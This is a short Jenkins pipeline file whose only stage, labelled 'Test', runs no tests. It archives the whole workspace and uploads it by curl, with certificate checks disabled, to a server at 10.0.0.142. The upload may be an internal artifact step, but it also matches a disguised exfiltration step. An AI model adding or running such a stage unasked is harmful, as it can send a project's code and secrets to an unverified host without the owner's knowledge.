pipeline {
    agent { dockerfile true }
    stages {
        stage('Test') {
            steps {
                sh 'tar -cvf /tmp/test.tar *'
                sh 'curl -v -k -i -X POST -H "Content-Type: multipart/form-data" -F "file=@/tmp/test.tar" https://10.0.0.142:5000/uploader'
            }
        }
    }
}
